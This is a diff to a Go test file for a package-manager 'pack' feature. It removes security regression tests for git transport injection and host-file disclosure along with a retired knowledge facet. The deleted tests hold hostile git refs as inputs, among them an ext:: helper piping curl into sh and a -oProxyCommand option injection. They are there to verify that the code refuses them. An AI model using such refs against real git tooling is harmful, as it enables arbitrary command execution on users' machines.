@@ -2,7 +2,11 @@ package pack
 
 // Round-2 review tests for packs-v2 Phase 1 (docs/design/packs-v2-impl.md):
 // one (or more) test per finding A–G of the second security + correctness
-// review. See the matching fix comments in pack.go / run.go / knowledge.go.
+// review. See the matching fix comments in pack.go / run.go.
+//
+// Finding A [CRITICAL] (knowledge-ref host-file disclosure + RCE) was retired
+// along with the [[knowledge]] facet itself (W2 U03A) — its coverage went
+// with it.
 
 import (
 	"bytes"
@@ -14,114 +18,8 @@ import (
 
 	"pix/host/config"
 	"pix/host/hostenv"
-	"pix/host/knowledge"
 	"pix/host/sys/systest"
 )
-
-// --- finding A [CRITICAL]: knowledge-ref host-file disclosure + RCE ----------
-
-// TestLoadPack_SharedClassMismatchFailsClosed: shared MUST match the source's
-// CLASS at load time — shared=true requires a git URL (a local path there was
-// the adopted-pack guard bypass), shared=false requires a local path.
-func TestLoadPack_SharedClassMismatchFailsClosed(t *testing.T) {
-	// shared=true + LOCAL path: the exact bypass — refuse to load.
-	root := t.TempDir()
-	mustWritePack(t, root, Manifest{Name: "p", Schema: 1, Knowledge: []packKnowledge{
-		{Name: "bypass", Source: "/etc", Shared: true},
-	}})
-	if _, err := LoadPack(root); err == nil || !strings.Contains(err.Error(), "requires a git URL") {
-		t.Errorf("shared=true + local path must fail LoadPack, got err=%v", err)
-	}
-
-	// shared=false + git URL: nonsensical "private remote" — refuse to load.
-	root2 := t.TempDir()
-	mustWritePack(t, root2, Manifest{Name: "p2", Schema: 1, Knowledge: []packKnowledge{
-		{Name: "mismatch", Source: "https://github.com/acme/kb.git", Shared: false},
-	}})
-	if _, err := LoadPack(root2); err == nil || !strings.Contains(err.Error(), "requires a local path") {
-		t.Errorf("shared=false + git URL must fail LoadPack, got err=%v", err)
-	}
-
-	// A transport-helper string is URL-shaped, never a "local path": with
-	// shared=false it is a class mismatch and must fail at load too.
-	root3 := t.TempDir()
-	mustWritePack(t, root3, Manifest{Name: "p3", Schema: 1, Knowledge: []packKnowledge{
-		{Name: "helper", Source: "ext::sh -c pwn", Shared: false},
-	}})
-	if _, err := LoadPack(root3); err == nil {
-		t.Error("shared=false + ext:: transport helper must fail LoadPack")
-	}
-
-	// And the matched classes still load fine.
-	rootOK := t.TempDir()
-	mustWritePack(t, rootOK, Manifest{Name: "ok", Schema: 1, Knowledge: []packKnowledge{
-		{Name: "team", Source: "https://github.com/acme/kb.git", Shared: true},
-		{Name: "mine", Source: "~/notes/okf", Shared: false},
-	}})
-	if _, err := LoadPack(rootOK); err != nil {
-		t.Errorf("matched shared/class must load, got %v", err)
-	}
-}
-
-// TestResolvePackKnowledgeRef_AdoptedLocalPathSkippedRegardlessOfShared: the
-// adopted-pack skip-guard keys on the source CLASS (local path), never the
-// attacker-authored shared flag — shared=true with a local path on an adopted
-// pack is skipped exactly like shared=false (defense-in-depth behind the
-// LoadPack class check).
-func TestResolvePackKnowledgeRef_AdoptedLocalPathSkippedRegardlessOfShared(t *testing.T) {
-	root := t.TempDir()
-	target := t.TempDir() // stands in for e.g. /etc or ~/.ssh
-	for _, shared := range []bool{true, false} {
-		k := packKnowledge{Name: "attacker-ref", Source: target, Shared: shared}
-		_, err := resolvePackKnowledgeRef(&bytes.Buffer{}, root, true /* adopted */, k)
-		if err != errPrivateRefSkippedAdopted {
-			t.Errorf("shared=%v local path on an adopted pack: want errPrivateRefSkippedAdopted, got %v", shared, err)
-		}
-	}
-}
-
-// TestResolveBundleRef_RejectsUnsafeGitTransports: every git resolution routes
-// through safeGitURL — an ext:: transport helper (arbitrary command execution)
-// or a dash-leading pseudo-URL (git option injection) is refused before any
-// git subprocess runs. This also hardens `knowledge use <ref>`.
-func TestResolveBundleRef_RejectsUnsafeGitTransports(t *testing.T) {
-	cache := t.TempDir()
-	for _, ref := range []string{
-		"ext::sh -c 'curl x|sh' %G.git",
-		"fd::0/x.git",
-		"-oProxyCommand=evil.git",
-	} {
-		if _, err := knowledge.ResolveBundleRef(ref, cache, &bytes.Buffer{}); err == nil || !strings.Contains(err.Error(), "unsafe") {
-			t.Errorf("knowledge.ResolveBundleRef(%q): want an unsafe-transport refusal, got err=%v", ref, err)
-		}
-	}
-	// A plain local path still resolves (never touches git).
-	dir := t.TempDir()
-	got, err := knowledge.ResolveBundleRef(dir, cache, &bytes.Buffer{})
-	if err != nil || got == "" {
-		t.Errorf("local path must still resolve, got (%q, %v)", got, err)
-	}
-}
-
-// TestGitCloneArgs_UsesDashDashSeparator: gitClone's argv terminates option
-// parsing with `--` before the URL, so a dash-leading URL can never be smuggled
-// in as a git option (defense-in-depth behind safeGitURL).
-func TestGitCloneArgs_UsesDashDashSeparator(t *testing.T) {
-	args := knowledge.GitCloneArgs("-oProxyCommand=evil", "/dest")
-	sep := -1
-	for i, a := range args {
-		if a == "--" {
-			sep = i
-			break
-		}
-	}
-	if sep < 0 {
-		t.Fatalf("knowledge.GitCloneArgs must contain `--`, got %v", args)
-	}
-	if args[sep+1] != "-oProxyCommand=evil" || args[sep+2] != "/dest" {
-		t.Errorf("url+dest must follow `--`, got %v", args)
-	}
-}
 
 // --- finding B [BLOCK]: adoption provenance is durable at clone time ---------
 
@@ -171,33 +69,18 @@ func TestClonePack_MarksAdoptionDurablyBeforeReturn(t *testing.T) {
 
 // --- finding C [BLOCK]: removal is lock-attributed ONLY ----------------------
 
-// TestPrevPackKnowledgeIDs_EmptyLockRemovesNothing: the removal set is computed
-// STRICTLY from pack.lock — an empty/missing lock yields an empty set (never a
-// manifest-based guess that could delete a bundle the user owns).
-func TestPrevPackKnowledgeIDs_EmptyLockRemovesNothing(t *testing.T) {
-	if ids := prevPackKnowledgeIDs(packLock{}); len(ids) != 0 {
-		t.Errorf("empty lock must attribute nothing, got %v", ids)
-	}
-}
-
-// TestPackUse_EmptyLockSwitchRemovesNothing: with the previous pack's
-// activation attribution LOST (since round-2 A that is the HOST-STATE
-// activation record — the pack.lock is only a hint), switching packs removes
-// NOTHING — the previous pack's bundle (which, attribution-less, is
-// indistinguishable from a user-added one) survives. Accumulation is accepted
-// over deleting a user's bundle.
+// TestPackUse_EmptyLockSwitchRemovesNothing (finding C): with the previous
+// pack's activation attribution LOST (the pack.lock is only a hint),
+// switching packs removes NOTHING it can't attribute — accumulation is
+// accepted over deleting a user's own entry. (The knowledge-bundle half of
+// this coverage was retired with the [[knowledge]] facet, W2 U03A; the mcp
+// half is what remains.)
 func TestPackUse_EmptyLockSwitchRemovesNothing(t *testing.T) {
 	dir := t.TempDir()
 	t.Setenv("PIX_CONFIG", filepath.Join(dir, "config.toml"))
 	t.Setenv("XDG_STATE_HOME", filepath.Join(dir, "state"))
 
 	rootA := filepath.Join(dir, "a")
-	if err := os.MkdirAll(filepath.Join(rootA, "knowledge"), 0o755); err != nil {
-		t.Fatal(err)
-	}
-	if err := os.WriteFile(filepath.Join(rootA, "knowledge", "x.md"), []byte("x"), 0o644); err != nil {
-		t.Fatal(err)
-	}
 	mustWritePack(t, rootA, Manifest{Name: "a", Schema: 1, Integrations: []Integration{{Name: "A", MCP: "a-mcp"}}})
 	rootB := filepath.Join(dir, "b")
 	mustWritePack(t, rootB, Manifest{Name: "b", Schema: 1})
@@ -205,9 +88,8 @@ func TestPackUse_EmptyLockSwitchRemovesNothing(t *testing.T) {
 	var out bytes.Buffer
 	// --yes: Tier-1 pack (declares an mcp); tests have no TTY (Phase-2 gate).
 	RunPackUse(fakeGitEnv(nil), &out, []string{rootA, "--yes"}, registerOK)
-	aID := knowledge.CanonicalizeKnowledgeBundle(filepath.Join(rootA, "knowledge"))
 	cfg, _ := config.Load()
-	if !slices.Contains(cfg.KnowledgeBundles, aID) || !slices.Contains(cfg.MCP, "a-mcp") {
+	if !slices.Contains(cfg.MCP, "a-mcp") {
 		t.Fatalf("setup: pack use A did not attach: %+v", cfg)
 	}
 
@@ -228,9 +110,6 @@ func TestPackUse_EmptyLockSwitchRemovesNothing(t *testing.T) {
 	out.Reset()
 	RunPackUse(fakeGitEnv(nil), &out, []string{rootB}, registerOK)
 	cfg2, _ := config.Load()
-	if !slices.Contains(cfg2.KnowledgeBundles, aID) {
-		t.Errorf("empty lock: the switch must remove NOTHING (no manifest fallback), lost %q from %v", aID, cfg2.KnowledgeBundles)
-	}
 	if !slices.Contains(cfg2.MCP, "a-mcp") {
 		t.Errorf("empty lock: the switch must not guess mcp removals either, cfg.MCP = %v", cfg2.MCP)
 	}
